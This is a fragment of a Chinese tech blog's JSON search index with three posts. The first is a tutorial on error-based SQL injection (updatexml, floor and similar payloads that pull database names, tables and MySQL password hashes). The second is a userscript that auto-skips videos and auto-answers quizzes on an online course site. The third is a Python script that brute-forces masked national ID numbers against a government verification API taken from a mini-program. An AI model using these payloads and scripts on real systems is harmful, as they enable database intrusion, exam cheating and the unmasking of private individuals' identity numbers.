&#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; 报错注入攻击​ 在输入框输入报错的sql拼接语句 11&#x27; and info()-- 它的原理是下面一条语句会执行但是会报错，在报错信息中会返回数据库名称 1SELECT first_name,last_name from users WHERE user_id=&#x27;1&#x27; and info() 报错注入获取敏感信息​ 通过构造sql语句，返回带有数据库敏感信息的错误信息 11&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- 注意：这里为什么要用updatexml()呢，首先要先了解这个函数 updatexml(xml_doument,XPath_string,new_value)第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据 简单点说，这个函数有三个参数，我们利用第二个参数必须要更改信息的xpath语句来进行报错注入。 为什么要在第二个参数里面加上concat语句呢？因为updatexml（）第二个参数需要进行xpath校验，如果第二个参数哪里不是xpath语句它会进行一次校验然后把校验后的错误信息返回 但是采用 updatexml 报错函数 只能显示 32 长度的内容，如果获取的内容超过 32 字符就要采用字符串截取方法。每次获取 32 个字符串的长度。 除了 updatexml 函数支持报错注入外，mysql 还有很多函数支持报错。 例如： 12345678910111213141516171819201.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2)) as x from information_schema.tables group by x)a);2.extractvalue()select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));3.updatexml()select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));10.exp()select * from test where id=1 and exp(~(select * from(select user())a)); 在黑盒模式下进行报错注入​ 流程还是根之前一样 库名-》表名-》字段-》字段内容 获取库名11&#x27; and (updatexml(1,(select concat(&#x27;`&#x27;,(select database()),&#x27;`&#x27;)),1))-- 获取表名 这次用floor报错，floor报错不会出现长度问题11&#x27; and (select 1 from (select count(*),concat((select (select(select distinct concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=database() limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x)a)-- 获取表名为 guestbook 将limit 0,1 改成 1，1是获取第二个表users 获取字段获取users第一个字段 11&#x27; and (select 1 from(select count(*),,)) 获取账号密码 获取账号和密码需要root权限 123select authentication_string from mysql.user limit 1;select(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1))","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网安","slug":"网安","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"}]},{"title":"😎 colincora的传智播客小助手 😎","slug":"传智播客脚本制作","date":"2022-08-17T09:08:35.000Z","updated":"2023-08-17T09:34:18.269Z","comments":true,"path":"2022/08/17/传智播客脚本制作/","link":"","permalink":"http://blog.ioimp.top/2022/08/17/%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2%E8%84%9A%E6%9C%AC%E5%88%B6%E4%BD%9C/","excerpt":"","text":"介绍这是一个由 colincora 魔改的传智播客小助手，具备自动跳视频、自动答题以及对接一之题库的功能。 功能特点 📺 自动跳视频：小助手可以自动跳过已观看的视频，帮助你节省时间。 📝 自动答题：小助手可以自动回答一之题库中的题目，让你轻松通过考试。 📚 对接一之题库：小助手与一之题库对接，可以获取最新的题目和答案，保证你获取到准确的信息。 使用方法 首先，确保你已经安装了 浏览器油猴脚本【Tampermonkey】,并且复制脚本代码到新建脚本。 打开传智播客的学习平台，并登录你的账号。 在视频播放页面，启动小助手插件。 小助手会自动检测当前视频的进度，并跳过已观看的部分。 当遇到题目时，小助手会自动从一之题库获取答案，并填写在答题框中。 完成所有题目后，你可以继续观看视频，或者根据需要自行操作。 注意事项 本小助手仅供学习和参考使用，请勿用于非法用途。 使用本小助手可能违反传智播客的使用规定，请自行承担风险。 对接一之题库需要提供合法的账号信息，请确保你的账号合法有效。 免责声明本小助手仅为个人开发项目，不对使用该软件产生的任何问题负责。使用本小助手即代表您已经阅读并同意自行承担使用风险。 联系方式如有任何问题或建议，欢迎联系 colincora： 邮箱：&#51;&#x33;&#48;&#x30;&#53;&#49;&#57;&#x31;&#x36;&#49;&#64;&#x71;&#113;&#46;&#x63;&#111;&#x6d; 微信：REMINAX 贡献者 colincora 感谢所有为这个项目做出贡献的人！ 授权许可该项目采用 MIT 开源许可证。请查阅许可证文件以获取更多信息。 祝你学习愉快！😄 脚本代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324// ==UserScript==// @name colincora的传智播客小助手// @namespace *.com// @version 9.9.9// @description colin魔改 跳视频+自动答题 一名来自保定学院滴学生制作 Q3300519161// @author colincora// @match https://stu.ityxb.com/preview/detail/*// @namespace https://stu.ityxb.com/writePaper/busywork/*// @match https://stu.ityxb.com/writePaper/busywork/*// @match https://stu.ityxb.com/lookPaper/busywork/*// @grant GM_xmlhttpRequest// @grant GM_addStyle// @grant GM_log// @icon https://tch.ityxb.com/favicon.ico// ==/UserScript==var tibody;//题目数组var total = 0;//题目总数量var index = 0;//搜题索引自动增加 let url = window.location.href;console.log(&#x27;欢迎使用colincora传智播客小助手！作者QQ3300519161&#x27;); if(url.includes(&quot;https://stu.ityxb.com/preview/detail/&quot;))&#123; const courseName = document.querySelector(&#x27;p.course-name&#x27;);if (courseName) &#123; courseName.textContent = &#x27;&#x27;;&#125; console.log(&#x27;这是预习作业答题部分！&#x27;); window.onload = function()&#123;// var bgdiv = document.getElementsByClassName(&quot;question-info-box&quot;);//bgdiv.style.background = &quot;url(&#x27;https://i.postimg.cc/BZKZRRtJ/20220508084230592.jpg&#x27;)&quot;;//tibody=document.getElementsByClassName(&quot;question-title-box&quot;);//total = tibody.length; // 创建一个新的 div 元素 let newDiv = document.createElement(&quot;div&quot;); // 给它一些内容 let newContent = document.createTextNode(&quot;colincora！Q3300519161&quot;); // 添加文本节点 到这个新的 div 元素 newDiv.appendChild(newContent); newDiv.style.position=&#x27;fixed&#x27;; newDiv.style.backgroundColor=&#x27;red&#x27; // newDiv.style.width=&#x27;20px&#x27;; // newDiv.style.length=&#x27;20px&#x27;; newDiv.style.fontSize=&#x27;28px&#x27;; // document.querySelector(&quot;#beginHeaderNav&quot;).appendChild(newDiv); newDiv.style.top=&#x27;60px&#x27;; &#125;function zhongzhuan()&#123; var bgdiv = document.getElementsByClassName(&quot;question-info-box&quot;); tibody=document.getElementsByClassName(&quot;question-title-box&quot;); console.log(tibody) total = tibody.length; kaishi(tibody[index]);&#125;function kaishi(ti)&#123; let text=document.getElementsByClassName(&quot;question-title-box&quot;)[0].innerText.substring(4);console.log(text); GM_xmlhttpRequest(&#123;//油猴脚本提供的异步函数 method: &#x27;POST&#x27;, url: &#x27;http://cx.icodef.com/wyn-nb?v=4&#x27;,//网课接口 headers: &#123; &#x27;Content-type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#x27;Authorization&#x27;: &#x27;NLUIeWEHQHBAapeH&#x27; &#125;, data: &#x27;question=&#x27;+ encodeURIComponent(document.getElementsByClassName(&quot;question-title-box&quot;)[0].innerText.substring(4)), timeout: 2000, onload:function(xhr) &#123;//自动选择答案 let json=JSON.parse(xhr.responseText); let daan=json.data;if(json.code==-1)daan=&quot;答案未找到&quot;; console.log(xhr.responseText);let answerarray=daan.split(&#x27;#&#x27;);//答案数组 console.log(&#x27;答案数组：&#x27;+answerarray)let daanlength=ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;).length;//多少个选项for(let i=0;i&lt;daanlength;i++)&#123; for(let i2=0;i2&lt;answerarray.length;i2++) &#123; // console.log(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;、&#x27;)[1]); if(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;、&#x27;)[1]==answerarray[i2])ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].firstElementChild; &#125;&#125;//显示答案 let newdaan=&#x27; &#x27;;for(let i=0;i&lt;answerarray.length;i++) &#123; newdaan=newdaan+&#x27;&lt;br&gt;&#x27;+answerarray[i]; &#125; var text = document.querySelector(&#x27;.question-title-text&#x27;); text.innerHTML=document.getElementsByClassName(&quot;question-title-text&quot;)[0].innerHTML+ &quot;&lt;br&gt;答案:&quot;+newdaan; console.log(newdaan) text.style.color = &quot;red&quot;;text.style.fontSize = &quot;10px&quot;; if(index &lt; total - 1)//继续搜索接下来的题 &#123; setTimeout(function ()&#123; index = index + 1; kaishi(tibody[index]);&#125;, 1000); &#125; &#125; &#125;) &#125;(function() &#123; &#x27;use strict&#x27;;function skipp()&#123; const videos = document.getElementsByTagName(&#x27;video&#x27;) if (videos.length &gt; 0) &#123; for (const video of videos) &#123; video.play() video.currentTime = video.duration - 1 &#125;&#125;&#125;function skip() &#123; const progressBoxes = document.querySelectorAll(&#x27;span.point-progress-box&#x27;); for (const box of progressBoxes) &#123; if (box.innerHTML === &quot;100%&quot;) &#123; continue; &#125; else if (box.innerHTML === &quot;0%&quot;) &#123; const playIcons = box.parentElement.querySelectorAll(&#x27;i.icon-circle.play-ico&#x27;); if (playIcons.length &gt; 0) &#123; playIcons.forEach(function(icon) &#123; icon.click(); &#125; ); &#125; &#125; skipp(); &#125;&#125;function addAutoSkipBtn() &#123; var autoSkipBtn = document.createElement(&quot;input&quot;); autoSkipBtn.setAttribute(&quot;type&quot;, &quot;button&quot;); autoSkipBtn.setAttribute(&quot;value&quot;, &quot;开启自动跳过视频&quot;); autoSkipBtn.setAttribute(&quot;class&quot;, &quot;autoSkipBtn&quot;); autoSkipBtn.addEventListener(&quot;click&quot;, toggleAutoSkip); document.getElementsByClassName(&quot;course-name&quot;)[0].appendChild(autoSkipBtn); var div = document.querySelector(&#x27;.course-name&#x27;); div.insertAdjacentHTML(&#x27;afterend&#x27;, &#x27;&lt;a class=&quot;button&quot;&gt;查看答案&lt;/a&gt;&#x27;); document.querySelector(&#x27;.button&#x27;).onclick = function () &#123; zhongzhuan(); &#125;&#125;function toggleAutoSkip() &#123; var autoSkipBtn = document.querySelector(&quot;.autoSkipBtn&quot;); if (autoSkipBtn.getAttribute(&quot;value&quot;) == &quot;开启自动跳过视频&quot;) &#123; autoSkipBtn.setAttribute(&quot;value&quot;, &quot;关闭自动跳过视频&quot;); skip1() &#125; else &#123; autoSkipBtn.setAttribute(&quot;value&quot;, &quot;开启自动跳过视频&quot;); &#125;&#125;addAutoSkipBtn();function skip1() &#123; setInterval(function() &#123; skip(); &#125;, 3000);&#125;;&#125;)(); &#125;else&#123;window.onload = function()&#123; var bgdiv = document.getElementById(&quot;writeQuestion&quot;);//bgdiv.style.background = &quot;url(&#x27;https://i.postimg.cc/BZKZRRtJ/20220508084230592.jpg&#x27;)&quot;;tibody=document.getElementsByClassName(&quot;questionItem question-item-box&quot;);total = tibody.length; console.log(tibody[index]);kaishi(tibody[index]);//传入每道题 // 创建一个新的 div 元素 let newDiv = document.createElement(&quot;div&quot;); // 给它一些内容 let newContent = document.createTextNode(&quot;colincora！Q3300519161&quot;); // 添加文本节点 到这个新的 div 元素 newDiv.appendChild(newContent); newDiv.style.position=&#x27;fixed&#x27;; newDiv.style.backgroundColor=&#x27;red&#x27; // newDiv.style.width=&#x27;20px&#x27;; // newDiv.style.length=&#x27;20px&#x27;; newDiv.style.fontSize=&#x27;28px&#x27;; document.querySelector(&quot;#beginHeaderNav&quot;).appendChild(newDiv); newDiv.style.top=&#x27;60px&#x27;; &#125;function kaishi(ti)&#123; GM_xmlhttpRequest(&#123;//油猴脚本提供的异步函数 method: &#x27;POST&#x27;, url: &#x27;http://cx.icodef.com/wyn-nb?v=4&#x27;,//网课接口 headers: &#123; &#x27;Content-type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#x27;Authorization&#x27;: &#x27;NLUIeWEHQHBAapeH&#x27; &#125;, data: &#x27;question=&#x27;+ encodeURIComponent(ti.getElementsByClassName(&quot;question-title-box&quot;)[0].innerText), timeout: 2000, onload:function(xhr) &#123;//自动选择答案 let json=JSON.parse(xhr.responseText); let daan=json.data;if(json.code==-1)daan=&quot;答案未找到&quot;;// console.log(xhr.responseText.code);let answerarray=daan.split(&#x27;#&#x27;);//答案数组let daanlength=ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;).length;//多少个选项for(let i=0;i&lt;daanlength;i++)&#123; for(let i2=0;i2&lt;answerarray.length;i2++) &#123; // console.log(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;、&#x27;)[1]); //if(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;、&#x27;)[1]==answerarray[i2])ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].firstElementChild.click(); &#125;&#125;//显示答案 let newdaan=&#x27; &#x27;;for(let i=0;i&lt;answerarray.length;i++) &#123; newdaan=newdaan+&#x27;&lt;br&gt;&#x27;+answerarray[i]; &#125; ti.getElementsByClassName(&quot;question-title-box&quot;)[0].innerHTML += &quot;&lt;br&gt;答案:&quot;+newdaan; ti.getElementsByClassName(&quot;question-title-box&quot;)[0].style.color = &quot;red&quot;; ti.getElementsByClassName(&quot;question-title-box&quot;)[0].style.fontSize = &quot;10px&quot;; if(index &lt; total - 1)//继续搜索接下来的题 &#123; setTimeout(function ()&#123; index = index + 1; kaishi(tibody[index]);&#125;, 1000); &#125; &#125; &#125;) &#125;(function() &#123; &#x27;use strict&#x27;;&#125;)(); &#125;GM_addStyle(`.button &#123; background: #eb94d0 !important; /* 创建渐变 */ background-image: -webkit-linear-gradient(top, #eb94d0, #2079b0); background-image: -moz-linear-gradient(top, #eb94d0, #2079b0); background-image: -ms-linear-gradient(top, #eb94d0, #2079b0); background-image: -o-linear-gradient(top, #eb94d0, #2079b0); background-image: linear-gradient(to bottom, #eb94d0, #2079b0); /* 给按钮添加圆角 */ -webkit-border-radius: 28; -moz-border-radius: 28; border-radius: 28px; text-shadow: 3px 2px 1px #9daef5; -webkit-box-shadow: 6px 5px 24px #666666; -moz-box-shadow: 6px 5px 24px #666666; box-shadow: 6px 5px 24px #666666; font-family: Arial; color: #fafafa; font-size: 5px; padding: 3px; text-decoration: none;&#125;.button:hover&#123; background:#2079b0 !important; /*:hover CSS伪类,鼠标悬停效果,这里是鼠标放上去就变色*/ background-image: -webkit-linear-gradient(top, #2079b0, #eb94d0); background-image: -moz-linear-gradient(top, #2079b0, #eb94d0); background-image: -ms-linear-gradient(top, #2079b0, #eb94d0); background-image: -o-linear-gradient(top, #2079b0, #eb94d0); background-image: linear-gradient(to bottom, #2079b0, #eb94d0); text-decoration: none;&#125;`)","categories":[{"name":"技术","slug":"技术","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"网课","slug":"网课","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E8%AF%BE/"}]},{"title":"身份证二要素验证","slug":"身份证二要素验证","date":"2022-08-17T09:03:17.000Z","updated":"2023-08-17T09:07:17.004Z","comments":true,"path":"2022/08/17/身份证二要素验证/","link":"","permalink":"http://blog.ioimp.top/2022/08/17/%E8%BA%AB%E4%BB%BD%E8%AF%81%E4%BA%8C%E8%A6%81%E7%B4%A0%E9%AA%8C%E8%AF%81/","excerpt":"","text":"SfzVertify身份证二要素验证​ 身份证号是的编排是有一定规律可循的。除了最后1位是校验位外，其余各位与出生地、出生日期、性别、出生编号息息相关，因此即使是经脱敏处理的身份证号，仍能通过程序分析的方式过滤出可能的身份证序列组合。所以我们可以通过出生地、出生日期、性别、出生编号这些信息进行身份证的猜解，从而实现身份证号码bp. 这个API是上海随申办身份证二要素抓包抓出来的1234567891011121314151617181920212223242526272829303132def check(): url = &quot;https://suishenmafront1.sh.gov.cn/smzy/yqfkewm/relative/idcard-auth&quot; headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Linux; Android 12; M2012K11AC Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20221011 Mobile Safari/537.36 MMWEBID/4555 MicroMessenger/8.0.30.2260(0x28001E3B) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxc5059c3803665d9c&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;X-Requested-With&quot;: &quot;com.tencent.mm&quot; &#125; pron_name=input(&quot;请输入要验证的名字：&quot;) print(&quot;进行二要素验证，请耐心等待..........&quot;) f = open(&quot;sfz.txt&quot;, &quot;r&quot;) lines = f.readlines() for line in lines: line = line.strip() data = &#123; &quot;name&quot;: f&quot;&#123;pron_name&#125;&quot;, &quot;id_card&quot;: line, &quot;mw&quot;: &quot;tChGO5otqa6EEnpLpO5bfyXgLMtLQFynXhpsSS3ZDPWi29wZbe0TuOhDMUwl3QSP6YEJKJShiBUn820KajqFDahFOCyQnr 3YRqdWy 2Pw9PzvCa GP2nm7KWFSzrrlFr/LzA2sPTCPPoRK/UvENLQ==&quot; &#125; try: r = requests.post(url, headers=headers, json=data).json() if (r[&#x27;code&#x27;] == 200): fok = open(&quot;successful.txt&quot;, &#x27;a+&#x27;) fok.write(line) fok.close print(line + &quot;|&quot; + str(r[&#x27;code&#x27;])) except Exception as e: fe = open(&quot;fail.txt&quot;, &#x27;a+&#x27;) fe.write(line) fe.close 其他API1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283import os, sys, requestsdef suishenma(name, idcard): url = &quot;https://suishenmafront1.sh.gov.cn/smzy/yqfkewm/relative/idcard-auth&quot; headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Linux; Android 12; M2012K11AC Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20221011 Mobile Safari/537.36 MMWEBID/4555 MicroMessenger/8.0.30.2260(0x28001E3B) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxc5059c3803665d9c&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;X-Requested-With&quot;: &quot;com.tencent.mm&quot; &#125; data = &#123; &quot;name&quot;: name, &quot;id_card&quot;: str(idcard), &quot;mw&quot;: &quot;tChGO5otqa6EEnpLpO5bfyXgLMtLQFynXhpsSS3ZDPWi29wZbe0TuOhDMUwl3QSP6YEJKJShiBUn820KajqFDahFOCyQnr 3YRqdWy 2Pw9PzvCa GP2nm7KWFSzrrlFr/LzA2sPTCPPoRK/UvENLQ==&quot; &#125; try: r = requests.post(url, headers=headers, json=data) rescode = r.json()[&quot;code&quot;] if (rescode == 200): status = &quot;校验正确&quot; else: status = r.json()[&quot;message&quot;] print(&quot;上海随申码: &quot; + status) except Exception as e: passdef guyunge(name, idcard): url = &quot;https://api.guyunge.top/API/er.php&quot; headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&quot;, &#125; data = &#123; &quot;name&quot;: name, &quot;card&quot;: str(idcard), &quot;type&quot;: &quot;json&quot; &#125; try: r = requests.post(url, headers=headers, data=data) rescode = r.json()[&quot;code&quot;] if (rescode == 1): status = &quot;校验正确&quot; else: status = r.json()[&quot;text&quot;] print(&quot;孤云阁API: &quot; + status) except Exception as e: passdef tingfengke(name, idcard): url = &quot;http://tc.tfkapi.top/API/eysjy.php&quot; headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&quot;, &#125; data = &#123; &quot;name&quot;: name, &quot;num&quot;: str(idcard), &#125; try: r = requests.get(url, headers=headers, params=data).text if (r == &quot;校验成功-TFK&quot;): status = &quot;校验正确&quot; else: status = r print(&quot;听风客API: &quot; + status) except Exception as e: passif __name__ == &quot;__main__&quot;: suishenma(sys.argv[1], sys.argv[2]) guyunge(sys.argv[1], sys.argv[2]) tingfengke(sys.argv[1], sys.argv[2]) 代码进行提示123456print(&quot;请输入区号开始【例：230101哈尔滨市辖区】：&quot;) a_1 = int(input()) print(&quot;请输入区号结束【例：区号结束+1 230129+1延寿县】：&quot;) a_2 = int(input()) # 区号结束+1 230129+1延寿县 print(&quot;请输入出生年月日:【19820606】&quot;) s = input() + &quot;****&quot; # 举例：身份证号缺后四位","categories":[{"name":"技术","slug":"技术","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"网安","slug":"网安","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"}]}],"categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"},{"name":"爬虫开发","slug":"爬虫开发","permalink":"http://blog.ioimp.top/categories/%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91/"},{"name":"杂类学习","slug":"杂类学习","permalink":"http://blog.ioimp.top/categories/%E6%9D%82%E7%B1%BB%E5%AD%A6%E4%B9%A0/"},{"name":"K8s","slug":"K8s","permalink":"http://blog.ioimp.top/categories/K8s/"},{"name":"疑难解答","slug":"疑难解答","permalink":"http://blog.ioimp.top/categories/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94/"},{"name":"随笔","slug":"随笔","permalink":"http://blog.ioimp.top/categories/%E9%9A%8F%E7%AC%94/"},{"name":"Jenkins","slug":"Jenkins","permalink":"http://blog.ioimp.top/categories/Jenkins/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://blog.ioimp.top/categories/Ubuntu/"},{"name":"数据杂烩","slug":"数据杂烩","permalink":"http://blog.ioimp.top/categories/%E6%95%B0%E6%8D%AE%E6%9D%82%E7%83%A9/"},{"name":"Java学习","slug":"Java学习","permalink":"http://blog.ioimp.top/categories/Java%E5%AD%A6%E4%B9%A0/"},{"name":"开发奇遇记","slug":"开发奇遇记","permalink":"http://blog.ioimp.top/categories/%E5%BC%80%E5%8F%91%E5%A5%87%E9%81%87%E8%AE%B0/"},{"name":"实用技巧","slug":"实用技巧","permalink":"http://blog.ioimp.top/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"name":"网络安全","slug":"网络安全","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"网站搭建","slug":"网站搭建","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"},{"name":"技术","slug":"技术","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"},{"name":"proxy","slug":"proxy","permalink":"http://blog.ioimp.top/categories/proxy/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Vue基础","slug":"Vue基础","permalink":"http://blog.ioimp.top/tags/Vue%E5%9F%BA%E7%A1%80/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://blog.ioimp.top/tags/JavaScript/"},{"name":"Node.js","slug":"Node-js","permalink":"http://blog.ioimp.top/tags/Node-js/"},{"name":"WebPack","slug":"WebPack","permalink":"http://blog.ioimp.top/tags/WebPack/"},{"name":"异步操作","slug":"异步操作","permalink":"http://blog.ioimp.top/tags/%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/"},{"name":"Scrapy爬虫","slug":"Scrapy爬虫","permalink":"http://blog.ioimp.top/tags/Scrapy%E7%88%AC%E8%99%AB/"},{"name":"博客搭建教程","slug":"博客搭建教程","permalink":"http://blog.ioimp.top/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"name":"K8s基础学习","slug":"K8s基础学习","permalink":"http://blog.ioimp.top/tags/K8s%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"},{"name":"编程知识","slug":"编程知识","permalink":"http://blog.ioimp.top/tags/%E7%BC%96%E7%A8%8B%E7%9F%A5%E8%AF%86/"},{"name":"文章收录","slug":"文章收录","permalink":"http://blog.ioimp.top/tags/%E6%96%87%E7%AB%A0%E6%94%B6%E5%BD%95/"},{"name":"拯救小白系列","slug":"拯救小白系列","permalink":"http://blog.ioimp.top/tags/%E6%8B%AF%E6%95%91%E5%B0%8F%E7%99%BD%E7%B3%BB%E5%88%97/"},{"name":"日常小BUG","slug":"日常小BUG","permalink":"http://blog.ioimp.top/tags/%E6%97%A5%E5%B8%B8%E5%B0%8FBUG/"},{"name":"Jenkins学习","slug":"Jenkins学习","permalink":"http://blog.ioimp.top/tags/Jenkins%E5%AD%A6%E4%B9%A0/"},{"name":"Linux学习","slug":"Linux学习","permalink":"http://blog.ioimp.top/tags/Linux%E5%AD%A6%E4%B9%A0/"},{"name":"私域","slug":"私域","permalink":"http://blog.ioimp.top/tags/%E7%A7%81%E5%9F%9F/"},{"name":"爬虫数据","slug":"爬虫数据","permalink":"http://blog.ioimp.top/tags/%E7%88%AC%E8%99%AB%E6%95%B0%E6%8D%AE/"},{"name":"“知识库备份\"","slug":"“知识库备份","permalink":"http://blog.ioimp.top/tags/%E2%80%9C%E7%9F%A5%E8%AF%86%E5%BA%93%E5%A4%87%E4%BB%BD/"},{"name":"Jenkins","slug":"Jenkins","permalink":"http://blog.ioimp.top/tags/Jenkins/"},{"name":"Rancher","slug":"Rancher","permalink":"http://blog.ioimp.top/tags/Rancher/"},{"name":"influxDB","slug":"influxDB","permalink":"http://blog.ioimp.top/tags/influxDB/"},{"name":"cAdvisor","slug":"cAdvisor","permalink":"http://blog.ioimp.top/tags/cAdvisor/"},{"name":"Grafana","slug":"Grafana","permalink":"http://blog.ioimp.top/tags/Grafana/"},{"name":"Docker","slug":"Docker","permalink":"http://blog.ioimp.top/tags/Docker/"},{"name":"Java学习","slug":"Java学习","permalink":"http://blog.ioimp.top/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"微服务","slug":"微服务","permalink":"http://blog.ioimp.top/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"},{"name":"Boilerpipe","slug":"Boilerpipe","permalink":"http://blog.ioimp.top/tags/Boilerpipe/"},{"name":"url地址变迁","slug":"url地址变迁","permalink":"http://blog.ioimp.top/tags/url%E5%9C%B0%E5%9D%80%E5%8F%98%E8%BF%81/"},{"name":"Stack Overflow","slug":"Stack-Overflow","permalink":"http://blog.ioimp.top/tags/Stack-Overflow/"},{"name":"磁盘分区","slug":"磁盘分区","permalink":"http://blog.ioimp.top/tags/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/"},{"name":"kali-linux","slug":"kali-linux","permalink":"http://blog.ioimp.top/tags/kali-linux/"},{"name":"网安","slug":"网安","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"},{"name":"渗透必知必会","slug":"渗透必知必会","permalink":"http://blog.ioimp.top/tags/%E6%B8%97%E9%80%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"},{"name":"宝塔面板","slug":"宝塔面板","permalink":"http://blog.ioimp.top/tags/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF/"},{"name":"dolphinscheduler","slug":"dolphinscheduler","permalink":"http://blog.ioimp.top/tags/dolphinscheduler/"},{"name":"大数据分析平台","slug":"大数据分析平台","permalink":"http://blog.ioimp.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"},{"name":"GitHub","slug":"GitHub","permalink":"http://blog.ioimp.top/tags/GitHub/"},{"name":"clash","slug":"clash","permalink":"http: